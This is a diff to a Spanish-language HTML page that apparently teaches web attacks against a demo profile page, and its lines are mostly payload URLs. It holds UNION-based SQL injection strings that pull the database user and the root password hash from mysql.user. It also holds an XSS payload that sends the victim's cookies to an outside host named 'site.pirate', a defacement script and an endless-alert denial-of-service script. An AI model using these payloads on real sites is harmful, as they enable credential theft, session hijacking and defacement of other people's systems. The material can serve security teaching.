@@ -64,7 +64,7 @@ and open the template in the editor.
 <p>http://.../muna/perfil.php?id=-1 union all select 1,2,3,(select user()),5,6</p>
 <hr/>
 <p>Como ya tenemos al usuario de la base de datos, podemos averiguar su password. </p>
-<p>http://.../muna/perfil.php?id=-1 union all select 1,2,3,(select password from mysql.user where user='root' LIMIT 0,1),5,6</p>
+<p>http://.../muna/perfil.php?id=-1 union all select 1,2,3,(select authentication_string from mysql.user where user='root' LIMIT 0,1),5,6</p>
 <hr/>
 <p>&nbsp;</p>
 <h4>Ataques XSS</h4>
@@ -82,7 +82,7 @@ and open the template in the editor.
 <p>Podemos mandarle esta url a una victima y robarle sus cookies.</p>
 <p>http://.../muna/perfil.php?id=&lt;SCRIPT&gt; document.location='http://site.pirate/cgi-bin/script.cgi?'+document.cookie &lt;/SCRIPT&gt;</p>
 <hr/>
-<p>http://.../muna/perfil.php?id=&lt;script&gt;document.body.innerHTML=&quot;&lt;style&gt;body{visibility:hidden;}&lt;/style&gt;&lt;div style=visibility:visible;&gt;&lt;CENTER&gt;&lt;h1&gt;HACKEADO POR LOS PIRATAS&lt;/h1&gt;&lt;img src=''/&gt;&lt;/div&gt;&lt;/CENTER&gt;&quot;;&lt;/script&gt;</p>
+<p>http://.../muna/perfil.php?id=&lt;script&gt;document.body.innerHTML=&quot;&lt;style&gt;body{visibility:hidden;}&lt;/style&gt;&lt;div style=visibility:visible;&gt;&lt;CENTER&gt;&lt;h1&gt;HACKEADO POR LOS PIRATAS&lt;/h1&gt;&lt;img src='https://thumbs.dreamstime.com/b/pirata-informático-y-lucha-del-terrorismo-50326086.jpg'/&gt;&lt;/div&gt;&lt;/CENTER&gt;&quot;;&lt;/script&gt;</p>
 <hr/>
 <p>Podemos logar colgar su servidor con ataques del tipo DoS (Denegación de servicios)</p>
 <p>http://.../muna/perfil.php?id=&lt;script&gt;while(1)alert(&quot;Este mensaje saldrá indefinidamente&quot;);&lt;/script&gt;</p>
